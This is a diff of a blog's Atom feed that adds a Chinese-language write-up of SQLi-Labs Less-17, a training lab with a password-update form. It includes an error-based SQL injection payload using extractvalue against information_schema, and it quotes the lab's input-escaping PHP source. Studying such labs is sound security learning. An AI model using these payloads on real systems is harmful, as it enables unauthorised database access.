@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://ju5tw4nty0u.top/"/>
-  <updated>2018-03-26T07:37:17.633Z</updated>
+  <updated>2018-03-26T08:45:23.228Z</updated>
   <id>http://ju5tw4nty0u.top/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SQL-LABS入门到放弃6（part1）</title>
+    <link href="http://ju5tw4nty0u.top/2018/03/26/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%836%EF%BC%88part1%EF%BC%89/"/>
+    <id>http://ju5tw4nty0u.top/2018/03/26/SQL-LABS入门到放弃6（part1）/</id>
+    <published>2018-03-26T08:10:38.000Z</published>
+    <updated>2018-03-26T08:45:23.228Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在开始解题之前，我们先来了解几个数据库函数（增删改查）<br><a href="https://www.cnblogs.com/daxueshan/p/6687521.html" target="_blank" rel="noopener">函数介绍传送门</a></p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><ol><li>可以看到是一个修改密码的页面，利用的是update语句，首先我们找注入点，当输入<code>uname=admin&amp;passwd=ju5tw4nty0u&#39;&amp;submit=Submit</code>时报错<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></li></ol><p>可知对passwd的处理为单引号；</p><ol><li>因为这里没有具体回显，所以可以使用报错注入或者盲注；</li><li><p>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ju5tw4nty0u&apos; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))# &amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>盲注参考Less-5；</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这题是看了源码才把注意力放在password的，之前一直在试用uname进行注入，然后找了好久没有头绪，后面在源码看到了<code>check_input()</code>函数，这里对uname做了处理，我们可以看看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value))</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,15);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对参数的处理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&apos;uname&apos;]);  </span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br></pre></td></tr></table></figure></p><p>这里涉及到几个函数：</p><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><p>在预定义字符之前添加反斜杠的字符串<br><a href="http://www.w3school.com.cn/php/func_string_addslashes.asp" target="_blank" rel="noopener">详细介绍</a></p><h2 id="get-magic-quotes-gpc"><a href="#get-magic-quotes-gpc" class="headerlink" title="get_magic_quotes_gpc()"></a>get_magic_quotes_gpc()</h2><p><a href="http://php.net/manual/zh/function.get-magic-quotes-gpc.php" target="_blank" rel="noopener">详细介绍</a></p><h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a>stripslashes()</h2><p>删除由addslashes函数添加的反斜杠<br><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="noopener">详细介绍</a></p><h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h2><p>转义SQL语句中使用的字符串中的特殊字符<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">详细介绍</a></p><p>因为对username的输入做了各种转义处理，所以不能使用uname进行注入。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在开始解题之前，我们先来了解几个数据库函数（增删改查）&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/daxues
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
+    
+      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
+    
+  </entry>
   
   <entry>
     <title>SQL-LABS入门到放弃5（part1）</title>
